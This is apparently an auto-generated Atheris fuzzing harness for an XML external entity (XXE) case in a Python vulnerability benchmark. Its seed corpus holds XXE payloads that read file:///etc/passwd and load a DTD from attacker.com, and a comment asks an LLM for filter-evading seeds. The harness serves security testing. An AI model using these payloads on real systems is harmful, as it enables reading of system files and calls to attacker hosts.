# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/xxe
# function : BenchmarkTest00460_post
# file     : testcode/BenchmarkTest00460.py
# ================================================================
import atheris
import sys
import re
import os


from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/tuonglnc/repo/VulnHunterX/repos/python/benchmark-python"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from testcode.BenchmarkTest00460 import BenchmarkTest00460_post


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("[\\s\\S]+", re.IGNORECASE),

]
_RAISE_MESSAGE  = "ORACULUM_VIOLATION: captured={captured}"
_TAINTED_PARAMS = [{"name": "request", "index": -1, "type": "flask_request"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : xml.dom.minidom.parseString
# target_arg_index : None
# target_arg_name  : None
# input_strategy   : flask_view
# signature        : def BenchmarkTest00460_post()
# condition        : lambda arg0: '<!ENTITY' in arg0 or 'file://' in arg0 or 'http://' in arg0
# capture_what     : captured value
# skip_hint        : False
# ========================================


# === RECORDED_CALL SKELETON ===
# 1. INPUT GENERATION
#    - Generate inputs for tainted params using FuzzedDataProvider.
#    - For MULTIPLE params: split the buffer proportionally by param count.
#      For str/bytes params divide remaining bytes evenly; consume the last
#      str/bytes param with remaining bytes. Fixed-size types (int, float,
#      bool) consume their natural byte width first.
#      FORBIDDEN: Do NOT use ConsumeIntInRange() to index a strategy or branch.
#    - DO NOT embed a seed list inside TestOneInput or use ConsumeBool() to
#      select from a hardcoded list — seeds are managed externally in _SEED_CORPUS.
#
# 2. SKIP CONDITION
#    - Apply skip_hint early, return immediately if not met.
#
# 3. MOCK SETUP
#    - Patch `xml.dom.minidom.parseString` using `with patch(...) as mock_get:`.
#    - Return a realistic MagicMock so the function continues past the patched call.
#
# 4. ORACLE CHECK
#    - After the call, iterate mock_get.call_args_list.
#    - For each call: check call.args[None] first,
#      fall back to call.kwargs.get("None").
#    - Match against every pattern in _COMPILED_PATTERNS.
#    - On match → raise RuntimeError(_RAISE_MESSAGE)
#
# 5. EXCEPTION HANDLING
#    - except RuntimeError: raise   → never swallow oracle signals
#    - except Exception:    return  → only around the target function call
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    
    # Generate flask request data
    request_data = fdp.ConsumeString(fdp.remaining_bytes())
    
    # Create a mock Flask request object
    from unittest.mock import Mock
    request = Mock()
    request.get_data.return_value = request_data.encode('utf-8')
    request.form.to_dict.return_value = {}
    request.args.to_dict.return_value = {}
    request.headers.get.return_value = None
    request.cookies.get.return_value = None
    
    # Skip if no data
    if not request_data:
        return
    
    # Patch the sink
    with patch('xml.dom.minidom.parseString', return_value=MagicMock()) as mock_parse:
        try:
            # Call the target function with the mock request
            BenchmarkTest00460_post.__globals__['request'] = request
            BenchmarkTest00460_post()
        except Exception:
            # Ignore exceptions from the function execution
            return
        
        # Check captured arguments against oracle conditions
        for call in mock_parse.call_args_list:
            # Get the captured argument (first positional argument)
            if call.args:
                captured = call.args[0]
            elif call.kwargs:
                captured = call.kwargs.get('data', '')  # fallback if needed
            else:
                continue
                
            # Check if the captured value matches our oracle condition
            if isinstance(captured, str):
                if '<!ENTITY' in captured or 'file://' in captured or 'http://' in captured:
                    raise RuntimeError(_RAISE_MESSAGE.format(captured=captured))


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://example.com">]><foo>&xxe;</foo>',
    '<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY xxe SYSTEM \'file:///etc/passwd\'>">',
    '<root><element><![CDATA[<!ENTITY xxe SYSTEM "file:///etc/passwd">]]></element></root>',
    '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/malicious"> ]><test>&xxe;</test>',
    '<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%xxe;'
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "output/python/benchmark-python/fuzz_corpus/py_xxe_testcode_BenchmarkTest00460_py_45"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()